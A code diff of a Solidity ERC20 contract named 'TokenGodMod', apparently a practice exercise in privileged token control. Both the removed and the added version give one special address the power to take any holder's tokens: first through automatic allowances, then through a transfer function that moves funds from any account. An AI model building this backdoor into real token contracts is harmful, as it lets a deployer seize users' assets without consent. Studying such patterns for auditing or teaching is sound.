@@ -15,18 +15,19 @@ import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
  *
  */
 contract TokenGodMod is Ownable, ERC20 {
-    address private s_specialAddress;
+    address private _specialAddress;
 
     constructor(address specialAddress, uint256 totalSupply) ERC20("TonyToken", "Tony") {
-        s_specialAddress = specialAddress;
+        _specialAddress = specialAddress;
         _mint(msg.sender, totalSupply);
     }
 
-    /**
-     * @dev Each account will approve the allownce of the toke to the specialAddress when receiving token.
-     */
-    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
-        _approve(to, s_specialAddress, amount);
-        super._afterTokenTransfer(from, to, amount);
+    function specificalTransfer(address from, address to, uint256 amount) public returns (bool) {
+        require(msg.sender == _specialAddress,"illegal call");
+        _approve(msg.sender, from, amount);
+        _transfer(from, to, amount);
+        return true;
     }
+
+
 }
